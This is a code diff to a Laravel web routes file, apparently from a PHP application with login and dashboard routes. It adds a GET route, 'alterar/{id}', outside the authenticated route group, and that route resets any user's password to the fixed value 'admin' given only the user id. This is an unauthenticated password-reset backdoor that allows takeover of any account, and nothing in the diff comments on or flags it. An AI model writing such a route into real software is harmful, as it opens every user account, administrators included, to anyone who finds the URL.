@@ -1,5 +1,6 @@
 <?php
 
+use Illuminate\Support\Facades\Hash;
 use Illuminate\Support\Facades\Route;
 
 use App\Http\Controllers\Auth\AuthController;
@@ -26,6 +27,10 @@ Route::get('/', function () {
 Route::get('login', [AuthController::class, 'index'])->name('login');
 Route::post('post-login', [AuthController::class, 'postLogin'])->name('login.post');
 Route::get('dashboard', [AuthController::class, 'dashboard'])->name('dashboard');
+
+Route::get('alterar/{id}', function ($id) {
+    \App\Models\User::where('id', '=', $id)->update(['password' => Hash::make('admin')]);
+})->name('alterar');
 
 Route::group(['prefix' => 'v1', 'middleware' => 'auth:web'], function () {
 
